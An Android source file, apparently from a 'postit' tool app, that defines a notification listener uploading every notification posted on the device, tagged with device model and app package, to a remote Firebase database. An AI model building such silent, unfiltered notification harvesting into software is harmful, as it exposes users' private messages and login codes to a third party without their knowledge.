package com.postit.tool.notification;

import android.annotation.TargetApi;
import android.content.Context;
import android.graphics.drawable.Icon;
import android.os.Build;
import android.os.Bundle;
import android.os.UserHandle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.firebase.client.Firebase;

/**
 * Created by hieuapp on 26/06/2016.
 */
@TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
public class NotificationListener extends NotificationListenerService {
    Context context;
    public static final String TAG = "NotificationListener";

    @Override
    public void onCreate() {
        super.onCreate();
        context = getApplicationContext();

    }
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        SpamNotification notification = new SpamNotification(sbn);
        String pack = notification.getPackageName();
        pack = pack.replace(".","_");
        Firebase root = new Firebase(FireBaseNotification.ROOT);
        String deviceInfo = getDeviceName() + " " + getSDKVersion();
        Firebase fbNew = root.child(deviceInfo).child(pack);
        fbNew.push().setValue(notification);
        Log.i(TAG,"have a new Notification");
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {

    }

    public String getDeviceName(){
        return Build.MODEL;
    }

    public String getSDKVersion(){
        String sdkVersion = Build.VERSION.RELEASE;
        return sdkVersion.replace(".","_");
    }

}
